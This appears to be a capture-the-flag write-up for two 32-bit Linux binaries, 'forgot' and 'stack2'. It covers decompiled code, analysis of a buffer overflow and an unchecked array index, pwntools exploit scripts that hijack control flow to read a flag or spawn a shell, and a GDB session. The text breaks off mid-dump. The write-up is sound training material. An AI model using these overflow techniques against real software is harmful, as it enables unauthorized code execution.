<h2 id="forgot"><a href="#forgot" class="headerlink" title="forgot"></a>forgot</h2><p>Attachment: <a href="/filehost/apcaw/forgot">forgot</a><br>Description: Fawkes has been playing around with Finite State Automaton lately. While exploring the concept of implementing regular expressions using FSA he thought of implementing an email-address validator.<br>Recently, Lua started to annoy Fawkes. To this, Fawkes, challenged Lua to a battle of wits. Fawkes promised to reward Lua, only if she manages to transition to a non-reachable state in the FSA he implemented. The replication can be accessed here.</p>
<h3 id="Information-2"><a href="#Information-2" class="headerlink" title="Information"></a>Information</h3><p>Check:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file forgot</span><br><span class="line">forgot: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=35930a2d9b048236694e9611073b759e1c88b8c4, stripped</span><br><span class="line">$ checksec forgot</span><br><span class="line">[*] &#x27;/root/forgot&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>Pseudocode:<br><code>main</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">32</span>]; <span class="comment">// [esp+10h] [ebp-74h]</span></span><br><span class="line">  <span class="built_in"><span class="keyword">int</span></span> (*v3)(); <span class="comment">// [esp+30h] [ebp-54h]</span></span><br><span class="line">  <span class="built_in"><span class="keyword">int</span></span> (*v4)(); <span class="comment">// [esp+34h] [ebp-50h]</span></span><br><span class="line">  <span class="built_in"><span class="keyword">int</span></span> (*v5)(); <span class="comment">// [esp+38h] [ebp-4Ch]</span></span><br><span class="line">  <span class="built_in"><span class="keyword">int</span></span> (*v6)(); <span class="comment">// [esp+3Ch] [ebp-48h]</span></span><br><span class="line">  <span class="built_in"><span class="keyword">int</span></span> (*v7)(); <span class="comment">// [esp+40h] [ebp-44h]</span></span><br><span class="line">  <span class="built_in"><span class="keyword">int</span></span> (*v8)(); <span class="comment">// [esp+44h] [ebp-40h]</span></span><br><span class="line">  <span class="built_in"><span class="keyword">int</span></span> (*v9)(); <span class="comment">// [esp+48h] [ebp-3Ch]</span></span><br><span class="line">  <span class="built_in"><span class="keyword">int</span></span> (*v10)(); <span class="comment">// [esp+4Ch] [ebp-38h]</span></span><br><span class="line">  <span class="built_in"><span class="keyword">int</span></span> (*v11)(); <span class="comment">// [esp+50h] [ebp-34h]</span></span><br><span class="line">  <span class="built_in"><span class="keyword">int</span></span> (*v12)(); <span class="comment">// [esp+54h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+58h] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">size_t</span> i; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v14 = <span class="number">1</span>;</span><br><span class="line">  v3 = sub_8048604;</span><br><span class="line">  v4 = sub_8048618;</span><br><span class="line">  v5 = sub_804862C;</span><br><span class="line">  v6 = sub_8048640;</span><br><span class="line">  v7 = sub_8048654;</span><br><span class="line">  v8 = sub_8048668;</span><br><span class="line">  v9 = sub_804867C;</span><br><span class="line">  v10 = sub_8048690;</span><br><span class="line">  v11 = sub_80486A4;</span><br><span class="line">  v12 = sub_80486B8;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What is your name?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  <span class="built_in">fgets</span>(&amp;s, <span class="number">32</span>, stdin);</span><br><span class="line">  <span class="built_in">sub_80485DD</span>((<span class="keyword">int</span>)&amp;s);</span><br><span class="line">  <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;I should give you a pointer perhaps. Here: %x\n\n&quot;</span>, sub_8048654);</span><br><span class="line">  <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter the string to be validate&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v2);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = i;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(v2) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> ( v14 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">sub_8048702</span>(v2[i]) )</span><br><span class="line">          v14 = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2[i] == <span class="number">64</span> )</span><br><span class="line">          v14 = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">sub_804874C</span>(v2[i]) )</span><br><span class="line">          v14 = <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2[i] == <span class="number">46</span> )</span><br><span class="line">          v14 = <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">sub_8048784</span>(v2[i]) )</span><br><span class="line">          v14 = <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">sub_8048784</span>(v2[i]) )</span><br><span class="line">          v14 = <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">sub_8048784</span>(v2[i]) )</span><br><span class="line">          v14 = <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">sub_8048784</span>(v2[i]) )</span><br><span class="line">          v14 = <span class="number">9</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">        v14 = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  (*(&amp;v3 + --v14))();</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">fflush</span>(stdout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sub_8048702</code> (similar to <code>sub_804874C</code> and <code>sub_8048784</code>):</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">_BOOL4 __cdecl <span class="title">sub_8048702</span><span class="params">(<span class="keyword">char</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a1 &gt; <span class="number">96</span> &amp;&amp; a1 &lt;= <span class="number">122</span> || a1 &gt; <span class="number">47</span> &amp;&amp; a1 &lt;= <span class="number">57</span> || a1 == <span class="number">95</span> || a1 == <span class="number">45</span> || a1 == <span class="number">43</span> || a1 == <span class="number">46</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sub_80486CC</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_80486CC</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Eh] [ebp-3Ah]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">snprintf</span>(&amp;s, <span class="number">0x32</span>u, <span class="string">&quot;cat %s&quot;</span>, <span class="string">&quot;./flag&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">system</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Other functions are all about outputting strings.</p>
<h3 id="Analysis-2"><a href="#Analysis-2" class="headerlink" title="Analysis"></a>Analysis</h3><p>The whole routine of this program is to validate your mail address: first input your name string, then input the mail address to validate.</p>
<p>Our name will be saved in <code>s</code>, and our mail address will be saved on <code>v2</code>, while the magic function <code>sub_80486CC</code> empower us to <code>cat the flag</code>.<br>Remember <code>(*(&amp;v3 + --v14))();</code> at the tail of <code>main()</code>? It executes what <code>&amp;v3 + --v14</code> points to, so <code>v3</code> is clearly where we should overflow.</p>
<pre><code>char v2[32]; // [esp+10h] [ebp-74h]
int (*v3)(); // [esp+30h] [ebp-54h]
</code></pre>
<p>Vulnerability appears at <code>__isoc99_scanf(&quot;%s&quot;, v2);</code>, and the offset is easy to confirm, right? No no no, what exactly <code>&amp;v3 + --v14</code> means?<br>The <code>switch ... case</code> statements is long but easy to understand, so if we dont let <code>sub_8048702</code> and other conditions be true, <code>v14</code> will always be <code>1</code>, and <code>&amp;v3 + --v14</code> will always be <code>&amp;3</code>.</p>
<p>How to get <code>sub_8048702</code> false? After looking up the <code>ASCII</code> table, we can see all the uppercase letters are ok.</p>
<p>Eventually we get our exploit</p>
<h3 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;forgot&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">43897</span>)</span><br><span class="line">shelf = ELF(<span class="string">&#x27;forgot&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cat_flag_addr = <span class="number">0x80486CC</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> sh.recv() <span class="comment"># What is your name?</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> sh.recv() <span class="comment"># Enter the string to be validate</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;A&#x27;</span>*<span class="number">0x20</span> + p32(cat_flag_addr))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>Another payload is also ok:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">32</span> + <span class="string">&quot;a&quot;</span> * <span class="number">4</span> +  p32(flag_addr)</span><br></pre></td></tr></table></figure>
<p>A more concise payload is:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">43897</span>)</span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span>*<span class="number">63</span></span><br><span class="line">addr = <span class="number">0x080486cc</span></span><br><span class="line">overflow += p32(addr)</span><br><span class="line">r.send(overflow + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Enter the string to be validate&quot;</span>)</span><br><span class="line">flag = r.recv()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[*] Flag: &quot;</span> + flag</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure>
<p>Here is 63 because it inputs from <code>name</code> part, and it only receive 32 bytes but including 1 <code>\x00</code>, so still 32 left for <code>v2</code> part.</p>
<h2 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h2><p>Attachment: <a href="/filehost/apcaw/stack2">stack2</a><br>Description: None.</p>
<p>Just find out what is the flag.</p>
<h3 id="Information-3"><a href="#Information-3" class="headerlink" title="Information"></a>Information</h3><p>Check:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file stack2</span><br><span class="line">stack2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d39da4953c662091eab7f33f7dc818f1d280cb12, not stripped</span><br><span class="line">$ checksec stack2</span><br><span class="line">[*] &#x27;/root/stack2&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>Pseudocode:<br><code>main</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+18h] [ebp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+1Ch] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> k; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> l; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> v13[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v14; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v14 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;***********************************************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*                      An easy calc                       *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*Give me your numbers and I will return to you an average *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*(0 &lt;= x &lt; 256)                                           *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;***********************************************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How many numbers you have:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Give me your numbers&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5 &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">    v13[i] = v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = v5; ; <span class="built_in">printf</span>(<span class="string">&quot;average is %.2lf\n&quot;</span>, (<span class="keyword">double</span>)((<span class="keyword">long</span> <span class="keyword">double</span>)v9 / (<span class="keyword">double</span>)j)) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit&quot;</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v6);</span><br><span class="line">          <span class="keyword">if</span> ( v6 != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Give me your number&quot;</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">          <span class="keyword">if</span> ( j &lt;= <span class="number">0x63</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v3 = j++;</span><br><span class="line">            v13[v3] = v7;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;id\t\tnumber&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; j; ++k )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%d\t\t%d\n&quot;</span>, k, v13[k]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;which number to change:&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;new number:&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">      v13[v5] = v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt; j; ++l )</span><br><span class="line">      v9 += v13[l];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>hackhere</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hackhere</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">system</span>(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Address:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># hackhere()</span><br><span class="line">hackhere	0804859B	</span><br><span class="line"># system plt</span><br><span class="line">.plt:08048450                 jmp     ds:off_804A018</span><br><span class="line">.plt:08048450 _system         endp</span><br><span class="line"># &#x27;sh&#x27; string included</span><br><span class="line">.rodata:08048980 command         db &#x27;/bin/bash&#x27;,0        ; DATA XREF: hackhere+14↑o</span><br></pre></td></tr></table></figure>
<h3 id="Analysis-3"><a href="#Analysis-3" class="headerlink" title="Analysis"></a>Analysis</h3><p>Still a <code>ret2text</code>(return to <code>.text</code>). Vulnerability exists in <code>main()</code>, belongs to <code>change number</code> subfunction:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( v6 != <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;which number to change:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;new number:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">  v13[v5] = v7;                     &lt;--------vulnerable</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>The index of the array is totally controlled by our input, with no border check, which leads to writing anywhere (the value is controlled by us as well).</p>
<p>The final goal seems to be <code>hackhere()</code>, we can overwrite <code>ret addr</code> on the stack to execute that function, so the next step is to calculate the target offset&#x2F;index of array <code>v13</code>.</p>
<p>Though we have can see pseudocodes produced by IDA pro indicates the distance from <code>ebp</code> to <code>v13</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char v13[100]; // [esp+38h] [ebp-70h]</span><br></pre></td></tr></table></figure>
<p>But it uses <code>Canary</code> protection mechanism, memory mapping is like:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp =&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 =&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | local variables |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure>
<p>So <code>v13</code> may be at <code>ebp-0x70</code> but <code>ret addr</code> may not be at <code>ebp-0x70+0x4</code> (due to the canary). The truth is: the exact offset can only be confirmed after dynamic debugging.<br>We have to find out which part of the <code>stack</code> is <code>ret addr</code>, and where is array <code>v13</code> saved, then calculate the offset.</p>
<p>First we seek where <code>v13</code> is. I choose to input a unique number, then locate it on the stack. Since it is little-endian, we input <code>4</code> numbers: <code>120</code>(<code>0x78</code>), <code>86</code>(<code>0x56</code>), <code>52</code>(<code>0x34</code>) and <code>18</code>(<code>0x12</code>). Next search <code>0x12345678</code> on the <code>main()</code> stack frame: </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ gdb ./stack2 -q</span><br><span class="line">GEF <span class="keyword">for</span> linux ready, <span class="built_in">type</span> `gef` to start, `gef config` to configure</span><br><span class="line">88 commands loaded <span class="keyword">for</span> GDB 9.2 using Python engine 3.8</span><br><span class="line">Reading symbols from ./stack2...</span><br><span class="line">(No debugging symbols found <span class="keyword">in</span> ./stack2)</span><br><span class="line">gef➤  b main</span><br><span class="line">Breakpoint 1 at 0x80485de</span><br><span class="line">gef➤  r</span><br><span class="line">Starting program: /root/stack2</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">0x0804871e <span class="keyword">in</span> main ()</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────── registers ────</span><br><span class="line"><span class="variable">$eax</span>   : 0x1</span><br><span class="line"><span class="variable">$ebx</span>   : 0x0</span><br><span class="line"><span class="variable">$ecx</span>   : 0x0</span><br><span class="line"><span class="variable">$edx</span>   : 0xffffd31c  →  0x00000005</span><br><span class="line"><span class="variable">$esp</span>   : 0xffffd2f0  →  0x08048a97  →  0x47006425 (<span class="string">&quot;%d&quot;</span>?)</span><br><span class="line"><span class="variable">$ebp</span>   : 0xffffd3a8  →  0x00000000</span><br><span class="line"><span class="variable">$esi</span>   : 0xf7fbf000  →  0x001dfd6c</span><br><span class="line"><span class="variable">$edi</span>   : 0xf7fbf000  →  0x001dfd6c</span><br><span class="line"><span class="variable">$eip</span>   : 0x0804871e  →  &lt;main+334&gt; add esp, 0x10</span><br><span class="line"><span class="variable">$eflags</span>: [zero carry parity adjust SIGN <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line"><span class="variable">$cs</span>: 0x0023 <span class="variable">$ss</span>: 0x002b <span class="variable">$ds</span>: 0x002b <span class="variable">$es</span>: 0x002b <span class="variable">$fs</span>: 0x0000 <span class="variable">$gs</span>: 0x0063</span><br><span class="line">─────────────────── stack ────</span><br><span class="line">0xffffd2f0│+0x0000: 0x08048a97  →  0x47006425 (<span class="string">&quot;%d&quot;</span>?)    ← <span class="variable">$esp</span></span><br><span class="line">0xffffd2f4│+0x0004: 0xffffd31c  →  0x00000005</span><br><span class="line">0xffffd2f8│+0x0008: 0x00000002</span><br><span class="line">0xffffd2fc│+0x000c: 0x00000000</span><br><span class="line">0xffffd300│+0x0010: 0x080482fa  →  <span class="string">&quot;__libc_start_main&quot;</span></span><br><span class="line">0xffffd304│+0x0014: 0xf7fde875  →   add esp, 0x30</span><br><span class="line">0xffffd308│+0x0018: 0x08048238  →  0x00000062 (<span class="string">&quot;b&quot;</span>?)</span><br><span class="line">0xffffd30c│+0x001c: 0xffffd37c  →  0xf7e1665e  →   add esp, 0x10</span><br><span class="line">──────────────── code:x86:32 ────</span><br><span class="line">    0x8048713 &lt;main+323&gt;       push   eax</span><br><span class="line">    0x8048714 &lt;main+324&gt;       push   0x8048a97</span><br><span class="line">    0x8048719 &lt;main+329&gt;       call   0x8048480 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line"> →  0x804871e &lt;main+334&gt;       add    esp, 0x10</span><br><span class="line">    0x8048721 &lt;main+337&gt;       mov    eax, DWORD PTR [ebp-0x8c]</span><br><span class="line">    0x8048727 &lt;main+343&gt;       cmp    eax, 0x2</span><br><span class="line">    0x804872a &lt;main+346&gt;       je     0x80487a1 &lt;main+465&gt;</span><br><span class="line">    0x804872c &lt;main+348&gt;       cmp    eax, 0x2</span><br><span class="line">    0x804872f &lt;main+351&gt;       ja     0x804873b &lt;main+363&gt;</span><br><span class="line">────────────────── threads ────</span><br><span class="line">[<span class="comment">#0] Id 1, Name: &quot;stack2&quot;, stopped 0x804871e in main (), reason: SINGLE STEP</span></span><br><span class="line">─────────────────── trace ────</span><br><span class="line">[<span class="comment">#0] 0x804871e → main()</span></span><br><span class="line">─────────────────────────────</span><br><span class="line">gef➤  x/100x 0xffffd2f0</span><br><span class="line">0xffffd2f0:     0x08048a97      0xffffd31c      0x00000002      0x00000000</span><br><span class="line">0xffffd300:     0x080482fa      0xf7fde875      0x08048238      0xffffd37c</span><br><span class="line">0xffffd310:     0xf7ffdaa0      0x00000001      0x00000004      0x00000005</span><br><span class="line">0xffffd320:     0x00000012      0x00000004      0x00000000      0x00000004</span><br><span class="line">0xffffd330:     0x00000000      0x00000000      0x12345678      0xf7ffc800</span><br><span class="line">0xffffd340:     0xffffd390      0x00000000      0xf7ffd000      0x00000000</span><br><span class="line">0xffffd350:     0x00000000      0xffffd454      0xf7fbf000      0xf7fbda80</span><br><span class="line">0xffffd360:     0x00000000      0xf7fbf000      0xf7ffc800      0xf7fc2c88</span><br><span class="line">0xffffd370:     0xf7fbf000      0xf7fe4140      0x00000000      0xf7e1665e</span><br><span class="line">0xffffd380:     0xf7fbf3fc      0x00080000      0x00000007      0x0804894b</span><br><span class="line">0xffffd390:     0x00000001      0xffffd454      0xffffd45c      0xe4826000</span><br><span class="line">0xffffd3a0:     0xf7fe4140      0xffffd3c0      0x00000000      0xf7dfdef1</span><br><span class="line">0xffffd3b0:     0xf7fbf000      0xf7fbf000      0x00000000      0xf7dfdef1</span><br><span class="line">0xffffd3c0:     0x00000001      0xffffd454      0xffffd45c      0xffffd3e4</span><br><span class="line">0xffffd3d0:     0x00000001      0x00000000      0xf7fbf000      0x00000000</span><br><span class="line">0xffffd3e0:     0xf7ffd000      0x00000000      0xf7fbf000      0xf7fbf000</span><br><span class="line">0xffffd3f0:     0x00000000      0x13b16d8e      0x53ab8b9e      0x00000000</span><br><span 